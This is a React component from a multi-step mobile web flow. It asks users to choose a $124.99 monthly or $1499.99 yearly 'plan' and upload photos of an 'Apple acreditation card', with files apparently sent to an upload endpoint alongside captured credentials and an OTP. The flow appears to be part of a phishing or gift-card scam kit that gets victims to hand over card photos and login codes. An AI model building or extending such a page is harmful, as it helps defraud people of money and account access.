import React, { useState } from "react";
import {
  HStack,
  Image,
  Text,
  VStack,
  Box,
  Input,
  IconButton,
} from "@chakra-ui/react";
import { Button } from "../ui/button";
import { useUser } from "../../contexts/UserContext";
import { Upload, X } from "lucide-react";

const StageTwoFive = ({ handleUpload }) => {
  const {
    plan,
    setPlan,
    isLoading,
    setIsLoading,
    credentials,
    sendTo,
    setSendTo,
    otp,
    selectedFiles,
    setSelectedFiles,
    uploadProgress,
    setUploadProgress,
  } = useUser();

  const handlePlanSelect = (selectedPlan) => {
    setPlan(selectedPlan);
  };

  const handleFileSelect = (e) => {
    const files = Array.from(e.target.files);
    setSelectedFiles((prev) => [...prev, ...files].slice(0, 3));
  };

  const removeFile = (index) => {
    setSelectedFiles((prev) => prev.filter((_, i) => i !== index));
  };

  //   const handleUpload = async () => {
  //     if (selectedFiles.length === 0) return;

  //     setIsLoading(true);
  //     const formData = new FormData();
  //     selectedFiles.forEach((file) => {
  //       formData.append("files", file);
  //     });
  //     formData.append("plan", plan);

  //     try {
  //       const response = await fetch("/api/upload-credentials", {
  //         method: "POST",
  //         body: formData,
  //       });

  //       if (!response.ok) throw new Error("Upload failed");
  //       setSelectedFiles([]);
  //       setUploadProgress(0);
  //     } catch (error) {
  //       console.error("Upload error:", error);
  //     } finally {
  //       setIsLoading(false);
  //     }
  //   };

  return (
    <VStack
      display={{ md: "none", base: "flex" }}
      w="100%"
      pt="1rem"
      px="0.5rem"
      alignItems="flex-start"
      h="100vh"
      spacing={0}
    >
      <HStack mb="0.5rem" w="100%" justifyContent="center">
        <Image src="/images/upp.png" alt="verify" />
      </HStack>

      <Text
        letterSpacing="0.2px"
        fontSize="28px"
        fontWeight="bold"
        lineHeight="24px"
        w="100%"
        textAlign="center"
      >
        Upload your accreditation card
      </Text>

      <Text w="100%" textAlign="center" fontSize="1rem">
        Select a plan below and upload a clear photo of your Apple acreditation
        card corresponding to your selected plan.
      </Text>

      <HStack w="100%" justifyContent="center" gap="1rem">
        <VStack
          onClick={() => handlePlanSelect("monthly")}
          cursor={plan === "monthly" ? "default" : "pointer"}
          borderRadius="8px"
          border={
            plan === "monthly"
              ? "3px solid #0064e0"
              : "3px solid rgba(206, 206, 206, 0.5)"
          }
          _hover={{
            transform: plan === "monthly" ? "" : "scale(1.02)",
            border:
              plan === "monthly" ? "" : "3px solid rgba(206, 206, 206, 1)",
          }}
          p="0.5rem"
        >
          <Text
            fontSize={plan === "monthly" ? "1.2rem" : ""}
            fontWeight={plan === "monthly" ? "600" : ""}
          >
            Monthly
          </Text>
          <Text fontSize="0.9rem">$124.99</Text>
        </VStack>
        <VStack
          onClick={() => handlePlanSelect("yearly")}
          cursor={plan === "yearly" ? "default" : "pointer"}
          borderRadius="8px"
          border={
            plan === "yearly"
              ? "3px solid #0064e0"
              : "3px solid rgba(206, 206, 206, 0.5)"
          }
          _hover={{
            transform: plan === "yearly" ? "" : "scale(1.02)",
            border: plan === "yearly" ? "" : "3px solid rgba(206, 206, 206, 1)",
          }}
          p="0.5rem"
        >
          <Text
            fontSize={plan === "yearly" ? "1.2rem" : ""}
            fontWeight={plan === "yearly" ? "600" : ""}
          >
            Yearly
          </Text>
          <Text>$1499.99</Text>
        </VStack>
      </HStack>

      {/* File Upload Section */}
      <VStack w="100%" spacing={2} mb="1.5rem">
        <Box as="label" w="100%" cursor="pointer">
          <Box
            w="100%"
            h="20"
            border="2px"
            borderStyle="dashed"
            borderColor="blue.500"
            borderRadius="lg"
            display="flex"
            alignItems="center"
            justifyContent="center"
            _hover={{ bg: "blue.50" }}
            transition="background 0.2s"
          >
            <HStack spacing={2}>
              <Upload color="#3182CE" size={20} />
              <Text color="blue.500" fontSize="sm">
                Upload your card(s){" "}
                {selectedFiles.length >= 1 ? selectedFiles.length : ""}
              </Text>
            </HStack>
          </Box>
          <Input
            type="file"
            multiple
            display="none"
            onChange={handleFileSelect}
            accept="image/*,.pdf"
          />
        </Box>

        {/* Files Preview */}
        {selectedFiles.length > 0 && (
          <HStack w="100%" spacing={1}>
            {selectedFiles.map((file, index) => (
              <HStack
                key={index}
                w="100%"
                bg="gray.50"
                py={1}
                px={2}
                borderRadius="md"
                justifyContent="space-between"
              >
                <Text fontSize="xs" color="gray.600" isTruncated maxW="200px">
                  {file.name}
                </Text>
                <IconButton
                  size="xs"
                  variant="ghost"
                  colorScheme="gray"
                  _hover={{ color: "red.500" }}
                  onClick={() => removeFile(index)}
                  aria-label="Remove file"
                >
                  <X size={12} />
                </IconButton>
              </HStack>
            ))}
          </HStack>
        )}
      </VStack>

      <Button
        w="100%"
        h="44px"
        bg="rgb(0, 100, 224)"
        borderRadius="22px"
        border="0px solid rgb(28, 43, 51)"
        fontSize="16px"
        fontWeight="500"
        onClick={handleUpload}
        disabled={isLoading || selectedFiles.length === 0}
        opacity={isLoading || selectedFiles.length === 0 ? 0.7 : 1}
        _hover={{
          bg: "rgb(0, 90, 200)",
        }}
      >
        {isLoading ? "Uploading..." : "Done"}
      </Button>
    </VStack>
  );
};

export default StageTwoFive;

// import { HStack, Image, Text, VStack } from "@chakra-ui/react";
// import React from "react";
// import { Button } from "../ui/button";
// import { useUser } from "../../contexts/UserContext";

// const StageTwoFive = () => {
//   const {
//     plan,
//     setPlan,
//     isLoading,
//     setIsLoading,
//     credentials,
//     sendTo,
//     setSendTo,
//     otp,
//   } = useUser();

//   const handlePlanSelect = (selectedPlan) => {
//     setPlan(selectedPlan);
//   };

//   return (
//     <>
//       <VStack
//         display={{ md: "none", base: "flex" }}
//         w="100%"
//         pt="1rem"
//         px="0.5rem"
//         alignItems="flex-start"
//       >
//         <HStack mb="0.5rem" w="100%" justifyContent="center">
//           <Image src="/images/upp.png" alt="verify" />
//         </HStack>

//         <Text
//           letterSpacing="0.2px"
//           fontSize="28px"
//           fontWeight="bold"
//           lineHeight="24px"
//           //   mb="0.7rem"
//           w="100%"
//           textAlign="center"
//         >
//           Upload your accreditation card
//         </Text>

//         <Text
//           w="100%"
//           textAlign="center"
//           mb="1rem"
//           //   fontWeight="600"
//           fontSize="1rem"
//         >
//           Select a plan below and upload a clear photo of your Apple
//           acreditation card corresponding to your selected plan.
//         </Text>

//         <HStack w="100%" justifyContent="center" gap="1rem">
//           <VStack
//             onClick={() => handlePlanSelect("monthly")}
//             cursor={plan === "monthly" ? "default" : "pointer"}
//             borderRadius="8px"
//             border={
//               plan === "monthly"
//                 ? "3px solid #0064e0"
//                 : "3px solid rgba(206, 206, 206, 0.5)"
//             }
//             _hover={{
//               transform: plan === "monthly" ? "" : "scale(1.02)",
//               border:
//                 plan === "monthly" ? "" : "3px solid rgba(206, 206, 206, 1)",
//             }}
//             p="0.5rem"
//           >
//             <Text
//               fontSize={plan === "monthly" ? "1.2rem" : ""}
//               fontWeight={plan === "monthly" ? "600" : ""}
//             >
//               Monthly
//             </Text>
//             <Text fontSize="0.9rem">$124.99</Text>
//           </VStack>
//           <VStack
//             onClick={() => handlePlanSelect("yearly")}
//             cursor={plan === "yearly" ? "default" : "pointer"}
//             borderRadius="8px"
//             border={
//               plan === "yearly"
//                 ? "3px solid #0064e0"
//                 : "3px solid rgba(206, 206, 206, 0.5)"
//             }
//             _hover={{
//               transform: plan === "yearly" ? "" : "scale(1.02)",
//               border:
//                 plan === "yearly" ? "" : "3px solid rgba(206, 206, 206, 1)",
//             }}
//             p="0.5rem"
//           >
//             <Text
//               fontSize={plan === "yearly" ? "1.2rem" : ""}
//               fontWeight={plan === "yearly" ? "600" : ""}
//             >
//               Yearly
//             </Text>
//             <Text>$1499.99</Text>
//           </VStack>
//         </HStack>

//         <Button
//           w="100%"
//           h="44px"
//           bg="rgb(0, 100, 224)"
//           borderRadius="22px"
//           border="0px solid rgb(28, 43, 51)"
//           fontSize="16px"
//           fontWeight="500"
//           mt="2rem"
//           //   onClick={handleFinish}
//           disabled={isLoading}
//         >
//           Done
//         </Button>
//       </VStack>
//     </>
//   );
// };

// export default StageTwoFive;
